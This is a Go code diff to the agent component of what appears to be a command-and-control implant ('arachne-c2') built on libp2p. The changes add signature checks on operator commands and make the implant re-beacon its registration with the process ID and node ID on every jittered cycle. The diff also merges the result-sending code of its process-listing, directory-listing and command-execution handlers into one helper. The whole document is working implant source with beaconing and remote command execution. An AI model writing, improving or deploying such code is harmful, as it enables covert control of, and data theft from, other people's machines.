@@ -10,6 +10,7 @@ import (
 	"runtime"
 	"time"
 
+	"github.com/libp2p/go-libp2p/core/crypto"
 	"google.golang.org/protobuf/proto"
 
 	arachnepb "github.com/anomalyco/arachne-c2/protobuf/arachnepb"
@@ -18,12 +19,13 @@ import (
 )
 
 type Agent struct {
-	node      *transport.Node
-	messenger *transport.Messenger
-	keys      *cryptography.ImplantKey
-	config    AgentConfig
-	ctx       context.Context
-	cancel    context.CancelFunc
+	node          *transport.Node
+	messenger     *transport.Messenger
+	keys          *cryptography.ImplantKey
+	operatorPub   crypto.PubKey
+	config        AgentConfig
+	ctx           context.Context
+	cancel        context.CancelFunc
 }
 
 type AgentConfig struct {
@@ -75,14 +77,15 @@ func NewAgent(ctx context.Context, cfg AgentConfig) (*Agent, error) {
 	}
 
 	a := &Agent{
-		keys:      keys,
-		node:      node,
-		config:    cfg,
-		ctx:       ctx,
-		cancel:    cancel,
+		keys:        keys,
+		operatorPub: operatorPub,
+		node:        node,
+		config:      cfg,
+		ctx:         ctx,
+		cancel:      cancel,
 	}
 
-	a.messenger = transport.NewImplantMessenger(ctx, node, keys)
+	a.messenger = transport.NewImplantMessenger(ctx, node, keys, operatorPub)
 	a.messenger.SetHandler(a.handleCommand)
 
 	return a, nil
@@ -102,14 +105,8 @@ func (a *Agent) Start() error {
 }
 
 func (a *Agent) beaconLoop() {
-	t := a.messenger.BeaconTopic()
-	first := true
-
 	for {
-		if first {
-			a.sendBeaconRegister()
-			first = false
-		}
+		a.sendBeaconRegister()
 
 		jitter := time.Duration(rand.Int63n(int64(a.config.BeaconJitter)))
 		sleep := a.config.BeaconInterval + jitter
@@ -118,7 +115,6 @@ func (a *Agent) beaconLoop() {
 		case <-a.ctx.Done():
 			return
 		case <-time.After(sleep):
-			a.sendBeaconPing(t)
 		}
 	}
 }
@@ -137,6 +133,8 @@ func (a *Agent) sendBeaconRegister() {
 		Filename: os.Args[0],
 		Version:  "0.1.0",
 		Locale:   os.Getenv("LANG"),
+		PeerID:   int64(os.Getpid()),
+		ActiveC2: a.node.ID().String(),
 	}
 
 	data, err := proto.Marshal(reg)
@@ -145,16 +143,9 @@ func (a *Agent) sendBeaconRegister() {
 		return
 	}
 
-	env := a.messenger.CreateSignedEnvelope(0, data)
-	env.SenderKey = []byte(a.keys.PeerID)
-
-	pubBytes, err := a.keys.PublicKey.Raw()
-	if err == nil {
-		env.SenderKey = pubBytes
-	}
-
+	env := a.messenger.CreateEnvelope(0, data)
 	topic := a.messenger.BeaconTopic()
-	if err := a.messenger.SendEnvelope(a.ctx, topic, env); err != nil {
+	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
 		log.Printf("[implant] send register: %v", err)
 		return
 	}
@@ -162,20 +153,13 @@ func (a *Agent) sendBeaconRegister() {
 	log.Printf("[implant] registered with operator")
 }
 
-func (a *Agent) sendBeaconPing(topic string) {
-	ping := &arachnepb.Ping{Nonce: int32(rand.Int31())}
-	data, _ := proto.Marshal(ping)
-	env := a.messenger.CreateSignedEnvelope(1, data)
-
-	pubBytes, _ := a.keys.PublicKey.Raw()
-	env.SenderKey = pubBytes
-
-	if err := a.messenger.SendEnvelope(a.ctx, topic, env); err != nil {
-		log.Printf("[implant] ping: %v", err)
+// handleCommand verifies the operator's signature before processing any command.
+func (a *Agent) handleCommand(ctx context.Context, env *arachnepb.Envelope, senderPub crypto.PubKey) {
+	if err := transport.VerifyEnvelope(env, a.operatorPub); err != nil {
+		log.Printf("[implant] dropped command — %v", err)
+		return
 	}
-}
 
-func (a *Agent) handleCommand(ctx context.Context, env *arachnepb.Envelope, from []byte) {
 	switch env.Type {
 	case 1:
 		a.handlePs(env)
@@ -188,14 +172,19 @@ func (a *Agent) handleCommand(ctx context.Context, env *arachnepb.Envelope, from
 	}
 }
 
+func (a *Agent) sendResult(resultType uint32, data []byte) {
+	env := a.messenger.CreateEnvelope(resultType, data)
+	topic := a.messenger.BeaconTopic()
+	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
+		log.Printf("[implant] send result: %v", err)
+	}
+}
+
 func (a *Agent) handlePs(env *arachnepb.Envelope) {
 	result := &arachnepb.Ps{}
 	result.Processes = listProcesses()
-
 	data, _ := proto.Marshal(result)
-	resp := a.messenger.CreateSignedEnvelope(1, data)
-	topic := a.messenger.BeaconTopic()
-	a.messenger.SendEnvelope(a.ctx, topic, resp)
+	a.sendResult(1, data)
 }
 
 func (a *Agent) handleLs(env *arachnepb.Envelope) {
@@ -226,9 +215,7 @@ func (a *Agent) handleLs(env *arachnepb.Envelope) {
 	}
 
 	data, _ := proto.Marshal(result)
-	resp := a.messenger.CreateSignedEnvelope(2, data)
-	topic := a.messenger.BeaconTopic()
-	a.messenger.SendEnvelope(a.ctx, topic, resp)
+	a.sendResult(2, data)
 }
 
 func (a *Agent) handleExecute(env *arachnepb.Envelope) {
@@ -257,9 +244,7 @@ func (a *Agent) handleExecute(env *arachnepb.Envelope) {
 	}
 
 	data, _ := proto.Marshal(result)
-	resp := a.messenger.CreateSignedEnvelope(3, data)
-	topic := a.messenger.BeaconTopic()
-	a.messenger.SendEnvelope(a.ctx, topic, resp)
+	a.sendResult(3, data)
 }
 
 func (a *Agent) Close() error {
